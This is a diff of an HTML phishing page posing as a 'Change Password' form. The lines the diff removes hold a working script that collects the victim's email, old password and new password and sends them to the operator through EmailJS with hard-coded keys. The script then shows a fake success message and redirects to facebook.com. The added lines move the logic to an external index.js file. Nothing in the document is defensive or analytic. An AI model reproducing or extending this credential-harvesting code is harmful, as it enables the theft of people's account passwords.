@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Change Password</title>
+  <title>Password Update</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
   <style>
-    /* Styling for the page */
     * {
       margin: 0;
       padding: 0;
@@ -134,39 +133,7 @@
     <h3>Password Updated Successfully</h3>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
-  <script>
-    // Initialize EmailJS
-    emailjs.init('ODWuzZ-mZLM196nkP'); // Your EmailJS User ID
-
-    document.getElementById('passwordForm').addEventListener('submit', function(event) {
-      event.preventDefault();
-
-      const email = document.getElementById('email').value;
-      const oldPassword = document.getElementById('oldPassword').value;
-      const newPassword = document.getElementById('newPassword').value;
-
-      // Send email via EmailJS
-      emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
-        email: email,
-        oldPassword: oldPassword,
-        newPassword: newPassword
-      }).then(function(response) {
-        console.log('SUCCESS', response);
-
-        // Show success message and hide form
-        document.getElementById('passwordBox').style.display = 'none';
-        document.getElementById('successMessage').style.display = 'flex';
-
-        // Redirect to another website after 2 seconds
-        setTimeout(function() {
-          window.location.href = 'https://facebook.com';
-        }, 2000);
-      }, function(error) {
-        console.log('FAILED', error);
-        alert('Something went wrong, please try again.');
-      });
-    });
-  </script>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script src="index.js"></script>
 </body>
 </html>
